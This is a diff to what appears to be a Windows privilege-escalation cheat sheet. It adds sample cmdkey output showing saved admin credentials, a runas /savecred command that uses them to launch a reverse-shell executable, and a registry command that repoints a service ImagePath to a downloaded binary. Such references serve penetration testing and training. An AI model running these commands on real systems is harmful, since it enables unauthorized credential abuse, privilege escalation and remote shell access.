@@ -23,14 +23,39 @@ findstr /si password *.xml *.ini *.txt
 dir /s *pass* == *cred* == *vnc* == *.config*
 ```
 
+cmdkey
 ```
 cmdkey /list
-cmdkey /add:MyServer /user:MyUser /pass:MyPassword
+Currently stored credentials:
 
+    Target: WindowsLive:target=virtualapp/didlogical
+    Type: Generic 
+    User: 02nfpgrklkitqatu
+    Local machine persistence
+    
+    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
+    Type: Domain Password
+    User: WIN-QBA94KB3IOF\admin
+
+# Run the reverse_shell.exe executable using runas with the admin user's saved credentials:
+runas /savecred /user:admin C:\reverse_shell.exe
+
+cmdkey /add:MyServer /user:MyUser /pass:MyPassword
+```
+
+```
 vaultcmd /list
 vaultcmd /listcreds:"Web Credentials" /all
 ```
 
+## 🔹Programs and Processes🔹
+```
+Get-Process
+# 32 
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+# 64
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
 
 ## 🔹ENV variables🔹
 
@@ -168,6 +193,13 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 # Start
 net start regsvc
 ```
+
+## 🔸Service ImagePath🔸
+```
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService" -Name ImagePath -Value "C:\Users\Quickemu\Downloads\simpleService.exe"
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
+```
+
 ## ⭐Scheduld Tasks⭐
 ```
 Get-ScheduledTask
